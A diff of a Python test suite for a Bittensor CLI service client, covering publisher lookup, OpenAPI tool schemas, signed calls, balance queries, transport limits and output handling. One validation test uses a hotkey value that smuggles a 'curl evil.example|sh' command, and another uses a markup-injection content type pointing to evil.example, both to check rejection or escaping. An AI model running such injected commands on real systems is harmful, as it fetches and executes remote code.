@@ -213,14 +213,35 @@ class TestLoad:
         assert service.api_url == "https://svc.example/api/v1"
         assert service.balance_url == BALANCE_URL
 
+    def test_a_transferred_hotkey_is_no_longer_the_owner(self, web):
+        urls = {ALICE_HOT: DOC_URL, BOB_HOT: DOC_URL}
+        for substrate, global_listing in ((chain(urls), False), (every_service(urls), True)):
+            substrate.seed("SubtensorModule", "SubnetOwnerHotkey", [1], ALICE_HOT)
+            substrate.seed("SubtensorModule", "SubnetOwner", [1], ALICE)
+            substrate.seed("SubtensorModule", "Owner", [ALICE_HOT], BOB_HOT)
+            client = Client("finney", substrate=substrate)
+            if not global_listing:
+                with pytest.raises(ServiceError, match="no service from its subnet owner"):
+                    asyncio.run(services.load(client, 1))
+            published = asyncio.run(services.discover(client, None if global_listing else 1))
+            assert len(published) == 2 and not any(row.owner for row in published)
+
+    @pytest.mark.parametrize("netuid,hotkey", [(65536, ALICE_HOT), (-1, ALICE_HOT), (1, "invalid")])
+    def test_document_identifiers_are_validated(self, web, netuid, hotkey):
+        web.pages[DOC_URL] = document(publishers=[{"netuid": netuid, "hotkey": hotkey}])
+        with pytest.raises(ServiceError, match="does not list"):
+            asyncio.run(services.load_url(DOC_URL))
+
     def test_a_subnet_with_several_services_means_its_owners(self, web):
         owners = load({ALICE_HOT: DOC_URL, BOB_HOT: DOC_URL})
         assert (owners.hotkey, owners.owner) == (ALICE_HOT, True)
         web.pages[DOC_URL] = document(
             publishers=[{"netuid": 1, "hotkey": BOB_HOT}, {"netuid": 1, "hotkey": CAROL_HOT}]
         )
-        with pytest.raises(ServiceError, match="none of them the subnet owner's; name one"):
+        with pytest.raises(ServiceError, match="no service from its subnet owner"):
             load({BOB_HOT: DOC_URL, CAROL_HOT: DOC_URL})
+        with pytest.raises(ServiceError, match="name a validator"):
+            load({BOB_HOT: DOC_URL})
         validators = load({BOB_HOT: DOC_URL, CAROL_HOT: DOC_URL}, BOB_HOT)
         assert (validators.hotkey, validators.owner) == (BOB_HOT, False)
         web.pages[DOC_URL] = document()
@@ -281,17 +302,14 @@ class TestLoad:
         with pytest.raises(ServiceError, match=r"not an OpenAPI 3 spec \(swagger '2.0'\)"):
             load()
 
-    def test_without_a_btauth_scheme_every_operation_not_marked_open_is_signed(self, web):
+    def test_without_btauth_other_credentials_are_not_signed(self, web):
         undeclared = spec()
-        undeclared["components"]["securitySchemes"] = {"key": {"type": "http"}}
+        del undeclared["security"]
+        undeclared["components"]["securitySchemes"] = {"key": {"type": "http", "scheme": "bearer"}}
         web.pages[SPEC_URL] = undeclared
         auth = {op.id: op.auth for op in load().operations.values()}
-        assert (auth["listModels"], auth["listJobs"], auth["admin"], auth["maybe"]) == (
-            "open",
-            "hotkey",
-            "hotkey",
-            "optional",
-        )
+        assert (auth["listModels"], auth["listJobs"], auth["maybe"]) == ("open", "optional", "open")
+        assert "admin" not in auth and "both" not in auth
 
     def test_a_server_variable_takes_its_default(self, web):
         server = {"url": "https://{region}.svc.example", "variables": {"region": {"default": "eu"}}}
@@ -336,6 +354,11 @@ class TestLoad:
         with pytest.raises(ServiceError, match="lists 2 publishers; name one"):
             asyncio.run(services.load_url(DOC_URL, 1))
         assert asyncio.run(services.load_url(DOC_URL, 1, BOB_HOT)).hotkey == BOB_HOT
+        web.pages[DOC_URL] = document(
+            publishers=[{"netuid": 1, "hotkey": "5Abc;curl evil.example|sh;#"}]
+        )
+        with pytest.raises(ServiceError, match="does not list a publisher"):
+            asyncio.run(services.load_url(DOC_URL))
 
     def test_a_document_on_this_machine_is_read_as_on_a_localnet(self, web):
         local = "http://127.0.0.1:8080/services.json"
@@ -462,19 +485,6 @@ class TestOperations:
     @pytest.mark.parametrize(
         "path,operation,reason",
         [
-            (
-                "/clash",
-                {
-                    "operationId": "clash",
-                    "parameters": [{"name": "model", "in": "query"}],
-                    "requestBody": {
-                        "content": {
-                            "application/json": {"schema": {"$ref": "#/components/schemas/Job"}}
-                        }
-                    },
-                },
-                "has two inputs named 'model'",
-            ),
             ("/again", {"operationId": "listJobs"}, "repeats the operationId 'listJobs'"),
             (
                 "/file",
@@ -493,7 +503,7 @@ class TestOperations:
                 "needs 's' in 'cookie'",
             ),
         ],
-        ids=["clash", "repeat", "not-json", "cookie"],
+        ids=["repeat", "not-json", "cookie"],
     )
     def test_operations_that_break_the_standard_are_skipped_with_why(
         self, web, path, operation, reason
@@ -504,6 +514,78 @@ class TestOperations:
         service = load()
         assert f"POST {path} ({operation['operationId']}) {reason}" in map(str, service.skipped)
         assert "listModels" in service.operations
+        if path == "/again":
+            assert "listJobs" not in service.operations
+
+    def test_independent_parameter_and_body_values(self, web):
+        example = spec()
+        example["paths"]["/items/{id}"] = {
+            "put": {
+                "parameters": [{"name": "id", "in": "path", "schema": {"type": "string"}}],
+                "requestBody": {
+                    "content": {
+                        "application/json": {
+                            "schema": {
+                                "properties": {"id": {"type": "integer"}},
+                                "additionalProperties": True,
+                            }
+                        }
+                    }
+                },
+            }
+        }
+        web.pages[SPEC_URL] = example
+        op = load().operation("PUT /items/{id}")
+        assert op.prepare({"id": "path"})[-1] == b""
+        assert json.loads(op.prepare({"id": "path"}, body={"id": 3, "extra": 1})[-1]) == {
+            "id": 3,
+            "extra": 1,
+        }
+
+    def test_recursive_tools_keep_local_definitions_and_ref_constraints(self, web):
+        example = spec()
+        job = example["components"]["schemas"]["Job"]
+        job["properties"]["child"] = {"$ref": "#/components/schemas/Job", "maxProperties": 4}
+        web.pages[SPEC_URL] = example
+        schema = load().tool("createJob")["input_schema"]
+        child = schema["properties"]["body"]["properties"]["child"]
+        assert child["maxProperties"] == 4
+        ref = child["$ref"]
+        assert ref.startswith("#/$defs/")
+        assert schema["$defs"][ref.split("/")[-1]]["properties"]["child"]["$ref"] == ref
+
+    def test_tool_inputs_preserve_schema_literals_and_root_constraints(self, web):
+        example = spec()
+        schema = example["components"]["schemas"]["Job"]
+        literal = {"$ref": "literal text", "a": "x"}
+        schema.update(maxProperties=4, additionalProperties={"const": literal})
+        web.pages[SPEC_URL] = example
+        service = load()
+        exported = service.tool("createJob")["input_schema"]["properties"]["body"]
+        assert exported == schema
+        body = {"model": "m", "extra": literal}
+        assert json.loads(service.operation("createJob").prepare({"body": body})[-1]) == body
+        with pytest.raises(ServiceError, match="separate JSON body"):
+            service.operation("createJob").prepare({"model": "m", "body": body})
+
+    def test_a_literal_with_hidden_characters_is_not_exported(self, web):
+        example = spec()
+        example["components"]["schemas"]["Job"]["properties"]["model"]["enum"] = ["m\u200b"]
+        web.pages[SPEC_URL] = example
+        with pytest.raises(ServiceError, match="hidden characters"):
+            load().tool("createJob")
+
+    def test_export_rejects_external_refs_and_bounds_all_tools(self, web, monkeypatch):
+        example = spec()
+        example["components"]["schemas"]["Job"]["properties"]["input"] = {"$ref": "other.json"}
+        web.pages[SPEC_URL] = example
+        service = load()
+        with pytest.raises(ServiceError, match="unsupported reference"):
+            service.tool("createJob")
+        monkeypatch.setattr(services, "RESOLVE_BUDGET", 2)
+        assert service.tool("listModels")["name"] == "list-models"
+        with pytest.raises(ServiceError, match="limit"):
+            service.tools()
 
     def test_operations_named_alike_are_skipped(self, web):
         alike = spec()
@@ -649,8 +731,8 @@ class TestOperations:
         tool = service.tool("createJob")
         assert tool["name"] == "create-job" and tool == service.tool("create-job")
         schema = tool["input_schema"]
-        assert schema["type"] == "object" and schema["required"] == ["model"]
-        assert schema["properties"]["model"]["description"] == "Model id"
+        assert schema["type"] == "object" and schema["required"] == ["body"]
+        assert schema["properties"]["body"]["properties"]["model"]["description"] == "Model id"
         assert "$ref" not in json.dumps(schema)
         assert [t["name"] for t in service.tools()] == [
             op.command for op in service.operations.values()
@@ -781,6 +863,22 @@ class TestCall:
         method, url, headers, _ = web.sent[-1]
         assert (method, url) == ("GET", "https://svc.example/api/v1/models")
         assert http_auth.HEADER_SIGNATURE not in headers
+
+    def test_a_service_read_by_its_url_is_signed_for_only_on_this_machine(self, web, key):
+        service = asyncio.run(services.load_url(DOC_URL))
+        assert not service.signable
+        with pytest.raises(ServiceError, match="read by its url"):
+            asyncio.run(service.call("createJob", {"model": "m"}, signer=key))
+        web.pages["https://svc.example/api/v1/models"] = {"data": []}
+        assert asyncio.run(service.call("listModels", signer=key)).ok
+        assert http_auth.HEADER_SIGNATURE not in web.sent[-1][2]
+        assert load().signable
+        local = "http://127.0.0.1:8080/services.json"
+        web.pages[local] = document(
+            services=[{"type": "openapi", "endpoint": "http://127.0.0.1:8080/openapi.json"}]
+        )
+        web.pages["http://127.0.0.1:8080/openapi.json"] = spec(servers=[{"url": "/"}])
+        assert asyncio.run(services.load_url(local)).signable
 
     def test_a_signed_request_binds_the_target_body_and_service_hotkey(self, web, key):
         service = load()
@@ -938,6 +1036,21 @@ class TestBalance:
         assert http_auth.HEADER_SIGNATURE not in web.sent[-2][2]  # asked unsigned first
         assert caller(web.sent[-1], service).hotkey_ss58 == key.ss58_address
 
+    def test_balance_url_uses_only_the_requested_hotkey(self, web):
+        web.pages[DOC_URL] = document(
+            payments=[
+                {
+                    "type": "gamma",
+                    "signature": "btauth/1",
+                    "balance": f"{BALANCE_URL}?hotkey={ALICE_HOT}&version=",
+                }
+            ]
+        )
+        expected = f"{BALANCE_URL}?version=&hotkey={BOB_HOT}"
+        web.pages[expected] = {"hotkey": BOB_HOT}
+        assert asyncio.run(load().balance(BOB_HOT)) == {"hotkey": BOB_HOT}
+        assert web.sent[-1][1] == expected
+
     def test_a_balance_for_another_hotkey_is_refused(self, web):
         service = load()
         web.pages[f"{BALANCE_URL}?hotkey={BOB_HOT}"] = {"hotkey": ALICE_HOT, "remaining_usd": "9"}
@@ -1008,6 +1121,23 @@ class TestTransport:
         assert not services._is_global(address)
         assert services._is_global("64:ff9b::808:808") and services._is_global("8.8.8.8")
 
+    def test_public_services_connect_directly(self, monkeypatch):
+        monkeypatch.setenv("https_proxy", "http://proxy.example")
+        services._opener.cache_clear()
+        opener = services._opener(False)
+        assert not any(isinstance(h, urllib.request.ProxyHandler) for h in opener.handlers)
+
+    def test_exhausted_dns_capacity_obeys_the_request_deadline(self, monkeypatch):
+        monkeypatch.setattr(services, "_resolver_slots", threading.Semaphore(0))
+        with services._Deadline(0.05) as deadline, pytest.raises(TimeoutError):
+            services._lookup("unresolved.example", 443, deadline)
+
+    @pytest.mark.parametrize("seconds", [0, -1, float("nan"), float("inf"), 10**300, True])
+    def test_invalid_deadlines_never_start_a_request(self, seconds):
+        with pytest.raises(ServiceError) as error:
+            services._send("GET", "https://svc.example", {}, b"", timeout=seconds)
+        assert error.value.code == "input"
+
     def test_no_time_to_connect_is_a_timeout(self):
         with (
             socket.create_server(("127.0.0.1", 0)) as server,
@@ -1076,16 +1206,23 @@ class TestTransport:
             asyncio.run(cancelled(url))  # waits for the request's thread
             assert time.monotonic() - started < 2
 
-    def test_a_response_that_ends_early_is_refused(self):
+    @pytest.mark.parametrize("body", [b"", b"abc"])
+    def test_a_response_that_ends_early_is_refused(self, body):
         class Reply:
-            def __init__(self):
-                self.headers = {"content-length": "10"}
-
             def read(self, limit):
-                return b"abc"
+                return body
 
         with pytest.raises(ServiceError, match="ended early"):
-            services._read(Reply(), 1 << 20, "https://svc.example")
+            services._read(Reply(), 1 << 20, "https://svc.example", {"content-length": "10"})
+
+    @pytest.mark.parametrize(
+        "length,code",
+        [("-1", "unusable"), ("10,100", "unusable"), ("9" * 6000, "too_large")],
+    )
+    def test_malformed_or_oversized_lengths_fail_before_reading(self, length, code):
+        with pytest.raises(ServiceError) as error:
+            services._read(None, 1024, "https://svc.example", {"content-length": length})
+        assert error.value.code == code
 
     def test_a_response_over_the_limit_is_refused(self):
         class Reply:
@@ -1093,7 +1230,7 @@ class TestTransport:
                 return b"x" * limit
 
         with pytest.raises(ServiceError, match="over"):
-            services._read(Reply(), 1 << 20, "https://svc.example")
+            services._read(Reply(), 1 << 20, "https://svc.example", {})
 
 
 @contextlib.contextmanager
@@ -1148,6 +1285,9 @@ class TestCli:
         assert "does not list netuid 3" in json.loads(result.output)["error"]
         result = invoke("--json", "service", "show")
         assert result.exit_code == 2 and "btcli service list" in json.loads(result.output)["help"]
+        result = invoke("service", "call", "--url", DOC_URL, "create-job", "--model", "m")
+        assert result.exit_code == 2 and "read by its url" in result.output
+        assert not [sent for sent in web.sent if "/api/v1/" in sent[1]]
 
     def test_list_shows_usable_services_and_all_says_why_one_is_not(self, cli, monkeypatch):
         from bittensor.cli import context as cli_context
@@ -1169,6 +1309,19 @@ class TestCli:
         assert [r["usable"] for r in records if r["url"] == SPEC_URL] == [False]
         assert [r["url"] for r in records if r["problem"]] == [SPEC_URL]
 
+    def test_list_explains_when_every_publisher_is_broken(self, cli, monkeypatch):
+        from bittensor.cli import context as cli_context
+
+        substrate = every_service({BOB_HOT: "https://[invalid"})
+        monkeypatch.setattr(
+            cli_context, "Client", lambda network, **_: Client(network, substrate=substrate)
+        )
+        result = invoke("service", "list")
+        assert result.exit_code == 0 and "--all" in result.output
+        result = invoke("service", "list", "--all")
+        assert result.exit_code == 0 and "--service-hotkey" in result.output
+        assert "Invalid IPv6 URL" in result.output
+
     def test_show_lists_the_operations(self, cli):
         result = invoke("--json", "service", "show", "--netuid", "1")
         assert result.exit_code == 0, result.output
@@ -1176,13 +1329,17 @@ class TestCli:
         assert record["api"] == "https://svc.example/api/v1"
         ops = {op["operation"]: op for op in record["operations"]}
         assert ops["list-models"]["auth"] == "open" and "input_schema" not in ops["list-models"]
-        assert ops["create-job"]["required"] == ["model"]
+        assert ops["create-job"]["required"] == ["body"]
         assert "limit" in ops["create-job"]["optional"]
         assert f"--service-hotkey {ALICE_HOT}" in record["pay"]
         full = json.loads(invoke("--json", "service", "show", "--netuid", "1", "--schemas").output)
         job = next(op for op in full["operations"] if op["operation"] == "create-job")
-        assert job["input_schema"]["properties"]["model"]["type"] == "string"
-        assert job["input_schema"]["required"] == ["model"]
+        for operation in full["operations"]:
+            assert all(
+                operation[key] == value for key, value in ops[operation["operation"]].items()
+            )
+        assert job["input_schema"]["properties"]["body"]["properties"]["model"]["type"] == "string"
+        assert job["input_schema"]["required"] == ["body"]
 
     def test_show_groups_operations_by_tag_in_spec_order(self, cli):
         result = invoke("service", "show", "--netuid", "1")
@@ -1219,34 +1376,136 @@ class TestCli:
     def test_operation_help_lists_its_inputs_as_flags(self, cli):
         result = invoke("service", "call", "--netuid", "1", "create-job", "--help")
         assert result.exit_code == 0, result.output
-        for text in ("--limit", "INTEGER", "--model", "Model id", "--tags", "--no-dry-run"):
+        for text in ("--limit", "INTEGER", "--model", "Model id", "--tags", "--inputs"):
             assert text in result.output
         record = json.loads(
             invoke("--json", "service", "call", "--netuid", "1", "create-job", "--help").output
         )
         assert record["operation"] == "create-job" and record["auth"] == "hotkey"
-        assert record["input_schema"]["properties"]["model"]["type"] == "string"
+        assert (
+            record["input_schema"]["properties"]["body"]["properties"]["model"]["type"] == "string"
+        )
         last = invoke("service", "call", "--netuid", "1", "create-job", "--help", "--json")
         assert json.loads(last.output) == record
         assert not [sent for sent in cli.sent if "/api/v1/" in sent[1]]
 
     def test_inputs_are_flags_typed_by_the_spec(self, cli, tmp_path):
         cli.pages["https://svc.example/api/v1/jobs"] = {"id": "j1"}
-        model = tmp_path / "model.txt"
-        model.write_text("from-file\n")
+        inputs = tmp_path / "inputs.json"
+        inputs.write_text('{"dry_run":true}')
         result = invoke(
             "service", "call", "--netuid", "1", "create-job",
-            "--limit", "2", "--model", f"@{model}", "--tags", "a", "--tags=b", "--dry-run",
+            "--limit", "2", "--model", "@handle", "--tags", "a", "--tags=b",
+            "--inputs", f"@{inputs}",
         )  # fmt: skip
         assert result.exit_code == 0, result.output
         _, url, _, data = cli.sent[-1]
         assert url.endswith("/jobs?limit=2")
-        assert json.loads(data) == {"model": "from-file", "tags": ["a", "b"], "dry_run": True}
+        assert json.loads(data) == {"model": "@handle", "tags": ["a", "b"], "dry_run": True}
         assert caller(cli.sent[-1], load()).hotkey_ss58 == wallet_hotkey()
+
+    def test_reserved_controls_are_effective_before_inputs_or_signing(self, cli):
+        result = invoke(
+            "service", "call", "--netuid", "1", "create-job", "--model", "m", "--dry-run", "--json"
+        )
+        assert result.exit_code == 0, result.output
+        assert json.loads(result.stdout)["dry_run"]
+        result = invoke(
+            "service",
+            "call",
+            "--netuid",
+            "1",
+            "create-job",
+            "--model",
+            "@/does/not/exist",
+            "--help",
+        )
+        assert result.exit_code == 0, result.output
+        result = invoke("service", "call", "--netuid", "1", "missing-op", "--json")
+        assert json.loads(result.stderr)["code"] == "input"
+        for timeout in ["-1", "nan", "inf", "1e300"]:
+            result = invoke("service", "call", "--netuid", "1", "create-job", "--timeout", timeout)
+            assert result.exit_code == 2 and "--timeout" in result.output
+        assert not [sent for sent in cli.sent if "/api/v1/" in sent[1]]
+
+    def test_nullable_array_and_mixed_choices_preserve_input_types(self, cli):
+        api = spec()
+        fields = api["components"]["schemas"]["Job"]["properties"]
+        fields["tags"] = {"type": ["array", "null"], "items": {"type": "string"}}
+        fields["mode"] = {"anyOf": [{"const": "auto"}, {"type": "integer"}]}
+        cli.pages[SPEC_URL] = api
+        cli.pages["https://svc.example/api/v1/jobs"] = {}
+        result = invoke(
+            "service",
+            "call",
+            "--netuid",
+            "1",
+            "create-job",
+            "--tags=null",
+            "--mode=5",
+            '--model="quoted"',
+        )
+        assert result.exit_code == 0, result.output
+        assert json.loads(cli.sent[-1][3]) == {"tags": None, "mode": 5, "model": '"quoted"'}
+
+    def test_inspection_and_unsigned_calls_reserve_their_controls(self, cli, monkeypatch):
+        from bittensor.cli.commands import services as commands
+
+        def no_wallet(*args, **kwargs):
+            pytest.fail("this command must never request a signing key")
+
+        monkeypatch.setattr(commands, "_hotkey", no_wallet)
+        fixture = spec()
+        fixture["paths"]["/sample"] = {
+            "post": {
+                "operationId": "sample",
+                "security": [{"btauth": []}, {}],
+                "parameters": [
+                    {"name": key, "in": "query", "schema": {"type": "boolean"}}
+                    for key in ("help", "unsigned")
+                ],
+            }
+        }
+        cli.pages[SPEC_URL] = fixture
+        endpoint = "https://svc.example/api/v1/sample"
+        cli.pages[endpoint] = {}
+        args = ["service", "call", "--netuid", "1", "sample"]
+        for argv in (["--dry-run", *args], [*args, "--help"]):
+            result = invoke(*argv)
+            assert result.exit_code == 0, result.output
+            assert all(method != "POST" for method, *_ in cli.sent)
+        result = invoke(*args, "--unsigned", "--inputs", '{"help":true,"unsigned":false}')
+        assert result.exit_code == 0, result.output
+        method, url, headers, _ = cli.sent[-1]
+        assert method == "POST" and url == endpoint + "?help=true&unsigned=false"
+        assert http_auth.HEADER_SIGNATURE not in headers
+
+    def test_tool_schema_round_trips_colliding_body_and_parameter_names(self, cli):
+        api = spec()
+        api["paths"]["/jobs"]["post"]["parameters"] = [
+            {"name": "body", "in": "query", "schema": {"type": "string"}}
+        ]
+        api["components"]["schemas"]["Job"]["properties"]["help"] = {"type": "boolean"}
+        cli.pages[SPEC_URL] = api
+        cli.pages["https://svc.example/api/v1/jobs"] = {}
+        args = ["service", "call", "--netuid", "1", "create-job"]
+        definition = json.loads(invoke(*args, "--help", "--json").stdout)
+        properties = definition["input_schema"]["properties"]
+        name = next(name for name, schema in properties.items() if "properties" in schema)
+        body = {"model": "m", "help": True, "x": [None, {}]}
+        values = {"body": "query", name: body}
+        called = invoke(*args, "--inputs", json.dumps(values))
+        assert called.exit_code == 0, called.output
+        assert cli.sent[-1][1].endswith("?body=query") and json.loads(cli.sent[-1][3]) == body
+
+    def test_dry_run_cannot_be_consumed_as_an_output_filename(self, cli):
+        result = invoke("service", "call", "--netuid", "1", "list-models", "--out", "--dry-run")
+        assert result.exit_code == 2
+        assert not [sent for sent in cli.sent if "/api/v1/" in sent[1]]
 
     def test_btcli_options_and_inputs_never_clash(self, cli):
         cli.pages["https://svc.example/api/v1/jobs"] = {"id": "j1"}
-        result = invoke("service", "call", "--netuid", "1", "createJob", "--model", "--netuid")
+        result = invoke("service", "call", "--netuid", "1", "createJob", "--model=--netuid")
         assert result.exit_code == 0, result.output
         assert json.loads(cli.sent[-1][3]) == {"model": "--netuid"}
 
@@ -1269,7 +1528,7 @@ class TestCli:
         "args,error",
         [
             (["create-job", "--page", "1"], "has no input '--page'"),
-            (["create-job"], "needs --model"),
+            (["create-job"], "model"),
             (["create-job", "--model", "m", "--limit", "two"], "--limit takes INTEGER"),
             (["create-job", "--model", "m", "--limit", "NaN"], "--limit takes INTEGER"),
             (["create-job", "--model", "m", "--model", "n"], "given twice"),
@@ -1277,7 +1536,7 @@ class TestCli:
             (["create-job", "--no-model"], "--no-model takes no value"),
             (["create-job", "--inputs", "[1]"], "--inputs takes a JSON object"),
             (["create-job", "--inputs", '{"modle": "m"}'], "did you mean model"),
-            (["create-job", "--model", "@/no/such/file"], "cannot read"),
+            (["create-job", "--inputs", "@/no/such/file"], "cannot read"),
             (["creat-job"], "no operation 'creat-job' at Example; did you mean create-job"),
         ],
         ids=[
@@ -1327,33 +1586,24 @@ class TestCli:
         assert result.exit_code == 0, result.output
         assert http_auth.HEADER_SIGNATURE not in cli.sent[-1][2]
 
-    def test_a_run_of_calls_reads_the_chain_once(self, cli, monkeypatch):
+    def test_a_new_call_checks_the_current_publisher(self, cli, monkeypatch):
         from bittensor.cli import context as cli_context
 
-        cli.pages["https://svc.example/api/v1/models"] = {"data": ["m"]}
-        cli.pages["https://svc.example/api/v1/jobs"] = {"data": []}
         assert invoke("service", "show", "--netuid", "1").exit_code == 0
+        removed = chain({})
+        monkeypatch.setattr(
+            cli_context, "Client", lambda network, **_: Client(network, substrate=removed)
+        )
+        result = invoke("--json", "service", "call", "--netuid", "1", "list-jobs")
+        assert result.exit_code == 1 and json.loads(result.output)["code"] == "no_service"
+        assert all(http_auth.HEADER_SIGNATURE not in request[2] for request in cli.sent)
 
-        def no_chain(*args, **kwargs):
-            raise AssertionError("the chain was reached")
-
-        monkeypatch.setattr(cli_context, "Client", no_chain)
-        result = invoke("service", "call", "--netuid", "1", "list-models")
+    def test_balance_does_not_fetch_the_api_spec(self, cli):
+        cli.pages[SPEC_URL] = Response(503, {}, b"")
+        cli.pages[BALANCE_URL] = {"hotkey": BOB_HOT, "balance": 0}
+        result = invoke("--json", "service", "balance", "--netuid", "1", "--hotkey", BOB_HOT)
         assert result.exit_code == 0, result.output
-        result = invoke("service", "call", "--netuid", "1", "list-jobs")
-        assert result.exit_code == 0, result.output
-        assert cli.sent[-1][2][http_auth.HEADER_HOTKEY] == wallet_hotkey()
-
-    def test_a_service_gone_from_the_cache_is_read_from_the_chain(self, cli, monkeypatch):
-        from bittensor import config as cfg
-        from bittensor.settings import resolve_endpoint
-
-        endpoint = resolve_endpoint("finney")[1]
-        cfg.save_services(endpoint, 1, {BOB_HOT: SPEC_URL}, BOB_HOT)
-        result = invoke("--network", "finney", "service", "show", "--netuid", "1")
-        assert result.exit_code == 0, result.output
-        assert "Example on netuid 1" in result.output
-        assert cfg.load_services(endpoint, 1) == ({ALICE_HOT: DOC_URL}, ALICE_HOT)
+        assert fetches(cli, SPEC_URL) == 0
 
     def test_a_402_says_how_to_pay(self, cli):
         cli.pages["https://svc.example/api/v1/jobs"] = Response(
@@ -1363,15 +1613,17 @@ class TestCli:
         assert result.exit_code == 1
         assert "HTTP 402 from Example" in result.output
         text = " ".join(result.output.split())
-        assert f"btcli gamma spend --netuid 1 --service-hotkey {ALICE_HOT}" in text
-        assert text.endswith(f"--amount-gamma AMOUNT -w {_WALLET_NAME}")
+        assert f"gamma spend --netuid 1 --service-hotkey {ALICE_HOT}" in text
+        assert text.endswith("--amount-gamma AMOUNT") and f"-w {_WALLET_NAME}" in text
 
     def test_the_pay_hint_names_a_network_that_is_not_the_default(self, cli):
         cli.pages["https://svc.example/api/v1/jobs"] = Response(
             402, {"content-type": "application/json"}, b'{"error":"insufficient_balance"}'
         )
         result = invoke("--network", "test", "service", "call", "--netuid", "1", "list-jobs")
-        assert "btcli --network test gamma spend --netuid 1" in " ".join(result.output.split())
+        assert "btcli --network test -w testwallet gamma spend --netuid 1" in " ".join(
+            result.output.split()
+        )
 
     def test_an_answer_of_several_lines_keeps_them(self, cli):
         cli.pages["https://svc.example/api/v1/models"] = {
@@ -1402,6 +1654,63 @@ class TestCli:
         assert result.exit_code == 0, result.output
         assert out.read_bytes() == b"\x00\x01"
 
+    def test_output_commit_failure_keeps_the_old_file_and_complete_response(
+        self, cli, tmp_path, monkeypatch
+    ):
+        data = b"new paid response"
+        cli.pages["https://svc.example/api/v1/jobs"] = Response(200, {}, data)
+        out = tmp_path / "existing"
+        out.write_bytes(b"old")
+
+        def refused(source, target):
+            raise PermissionError("destination changed")
+
+        monkeypatch.setattr(Path, "replace", refused)
+        result = invoke(
+            "--json", "service", "call", "--netuid", "1", "list-jobs", "--out", str(out)
+        )
+        assert result.exit_code == 1, result.output
+        error = json.loads(result.output)
+        assert error["code"] == "output" and out.read_bytes() == b"old"
+        assert Path(error["out"]).read_bytes() == data
+
+    def test_failing_call_leaves_output_directory_untouched(self, cli, tmp_path):
+        cli.pages["https://svc.example/api/v1/jobs"] = Response(503, {}, b"busy")
+        folder = tmp_path / "output"
+        folder.mkdir()
+        result = invoke(
+            "service", "call", "--netuid", "1", "list-jobs", "--out", str(folder / "result")
+        )
+        assert result.exit_code == 1 and not list(folder.iterdir())
+
+    def test_terminal_json_preserves_distinct_keys_and_escapes_format_characters(self, capsys):
+        from rich.console import Console
+
+        from bittensor.cli.output import Output
+
+        output = Output(json_mode=True)
+        output._out = Console(force_terminal=True, color_system=None)
+        payload = {"name": 1, "na\u202eme": 2}
+        output.value(payload)
+        text = capsys.readouterr().out
+        assert "\u202e" not in text and json.loads(text) == payload
+
+    def test_headerless_binary_response_is_kept(self, cli):
+        data = b"model\x00data"
+        cli.pages["https://svc.example/api/v1/models"] = Response(200, {}, data)
+        result = invoke("--json", "service", "call", "--netuid", "1", "list-models")
+        assert result.exit_code == 0, result.output
+        path = Path(json.loads(result.output)["out"])
+        try:
+            assert path.read_bytes() == data
+        finally:
+            path.unlink()
+
+    def test_large_record_preview_preserves_nested_values_and_reports_omitted_rows(self, cli):
+        cli.pages["https://svc.example/api/v1/jobs"] = [{"machine": {"model": "Xeon"}}] * 51
+        result = invoke("service", "call", "--netuid", "1", "list-jobs")
+        assert result.exit_code == 0 and "Xeon" in result.output and "1 more row" in result.output
+
     def test_balance_is_signed_by_the_wallet_hotkey(self, cli):
         hotkey = wallet_hotkey()
         cli.pages[f"{BALANCE_URL}?hotkey={hotkey}"] = signed_only(
@@ -1430,8 +1739,7 @@ class TestCli:
         assert result.exit_code == 1 and json.loads(result.output)["code"] == "wallet"
         assert "'nosuch'" in json.loads(result.output)["error"]
         result = invoke("service", "call", "--netuid", "1", "list-models", "--network", "local")
-        assert result.exit_code == 2
-        assert "like --network go before the operation" in " ".join(result.output.split())
+        assert result.exit_code == 0, result.output
         result = invoke("--json", "service", "call", "list-models")
         assert result.exit_code == 2 and json.loads(result.output)["code"] == "input"
 
@@ -1452,7 +1760,7 @@ class TestCli:
         assert result.exit_code == 0, result.output
         assert json.loads(cli.sent[-1][3])["model"] == "m"
 
-    def test_an_untyped_input_takes_json_and_a_doubled_at_is_literal(self, cli):
+    def test_an_untyped_input_takes_json_and_text_as_written(self, cli):
         typed = spec()
         typed["paths"]["/free"] = {
             "post": {
@@ -1469,7 +1777,7 @@ class TestCli:
         }
         cli.pages[SPEC_URL] = typed
         cli.pages["https://svc.example/api/v1/free"] = {}
-        args = ["free", "--meta", '{"a": 1}', "--note", "@@home"]
+        args = ["free", "--meta", '{"a": 1}', "--note", "@home"]
         assert invoke("service", "call", "--netuid", "1", *args).exit_code == 0
         assert json.loads(cli.sent[-1][3]) == {"meta": {"a": 1}, "note": "@home"}
 
@@ -1537,7 +1845,7 @@ class TestCli:
         )
         result = invoke("service", "balance", "--netuid", "1")
         assert result.exit_code == 1 and "HTTP 402" in result.output
-        assert "btcli gamma spend --netuid 1" in " ".join(result.output.split())
+        assert "gamma spend --netuid 1" in " ".join(result.output.split())
 
     def test_a_text_response_reaches_the_terminal_without_controls(self, cli):
         cli.pages["https://svc.example/api/v1/models"] = Response(
@@ -1557,12 +1865,27 @@ class TestCli:
         assert "wrote 8 bytes of image/png to" in text
         Path(text.rsplit(" to ", 1)[1].replace(" ", "")).unlink()
 
+    def test_a_content_type_prints_as_text_not_markup(self, cli):
+        cli.pages["https://svc.example/api/v1/models"] = Response(
+            200, {"content-type": "video/[/x][link=https://evil.example]x[/link]"}, b"\x00\x01"
+        )
+        result = invoke("service", "call", "--netuid", "1", "list-models")
+        assert result.exit_code == 0, result.output
+        text = " ".join(result.output.split())
+        assert "of video/[/x][link=https://evil.example]x[/link] to" in text
+        Path(text.rsplit(" to ", 1)[1].replace(" ", "")).unlink()
+
+    def test_a_long_tag_description_titles_quickly(self):
+        from bittensor.cli.commands import services as commands
+
+        assert commands._tag_title("jobs", "[" * 1_000_000) == "jobs: " + "[" * 500
+
     def test_fields_that_flatten_to_one_name_print_as_json(self, cli):
         cli.pages["https://svc.example/api/v1/models"] = {"a.b": 1, "a": {"b": 2}}
         result = invoke("service", "call", "--netuid", "1", "list-models")
         assert result.exit_code == 0 and json.loads(result.output) == {"a.b": 1, "a": {"b": 2}}
 
-    def test_an_optional_operation_can_be_sent_unsigned(self, cli):
+    def test_an_optional_operation_is_signed_only_by_a_named_wallet(self, cli, monkeypatch):
         optional = spec()
         optional["paths"]["/tier"] = {
             "get": {"operationId": "tier", "security": [{"btauth": []}, {}]}
@@ -1579,6 +1902,10 @@ class TestCli:
         assert missing.exit_code == 1 and "cannot use hotkey 'nosuch'" in missing.output
